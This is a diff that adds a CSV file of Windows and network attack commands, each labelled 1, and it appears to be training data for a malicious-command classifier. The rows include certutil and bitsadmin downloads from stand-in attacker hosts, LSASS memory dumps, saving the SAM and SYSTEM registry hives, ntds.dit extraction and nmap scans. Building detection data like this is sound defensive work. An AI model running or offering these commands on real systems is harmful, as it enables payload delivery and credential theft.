@@ -1,0 +1,1201 @@
+text,label
+nmap -v -sn 192.168.135.84/24,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.169.125,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.72.254/24,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.108.59,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.185.77,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.252.168,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.155.152,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.117.117",1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.201.213/24,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.90.168,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.52.115,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.32.10,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.24.178/24,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.114.106,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.38.78/24,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.195.94,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.247.255",1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.81.243,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.252.94,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.58.180,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.245.61/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.197.232,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.95.217/24,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.231.181,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.134.213,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.125.162,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.4.51,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.186.52,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.71.245,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.28.214,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.17.73,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.49.251,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.211.191,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.17.238,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.133.110,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.30.144,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.101.73,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.89.37/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.158.196,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.93.205,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.105.180,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.68.115,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.96.179,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.249.30,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.178.47,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.119.193,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.128.134/24,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.155.224,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.51.222,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.82.246,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.71.206,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.62.203,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.248.113,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.236.39,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.241.94,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.212.189/24,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.56.200/24,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.149.132,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.100.35,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.152.169,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.78.29,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.126.233,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.83.103,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.98.184,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.45.137",1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.148.77,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.93.122/24,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.107.164/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.207.105,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.93.229",1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.56.227,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.20.88,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.37.15/24,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.189.128,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.11.80,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.178.154,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 445,139 192.168.176.110",1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.187.208,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.190.116,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.67.101",1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.251.92",1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.252.142,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.124.203,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.104.228,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.63.15,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.136.130,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.71.49/24,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.212.178,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.116.26,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.84.20,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.162.208,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.208.174/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.135.209/24,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.128.133,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.254.179,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.237.255,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.82.57,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.21.108,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.188.106,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.24.51,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.69.212,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.255.107,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.95.148/24,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.167.104,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.194.189,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.62.66,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.72.189",1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.230.90,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.104.15,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.2.24/24,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.188.93,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.199.205,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.18.156,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.38.99,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.158.6,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.62.184,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.3.248,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.147.213,1
+certutil.exe -verifyctl -f http://attacker.io/x,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.96.83,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -p- 192.168.65.35,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.34.164,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.3.171,1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.123.14,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.242.227,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.66.168/24,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.202.118,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.24.178,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.45.64,1
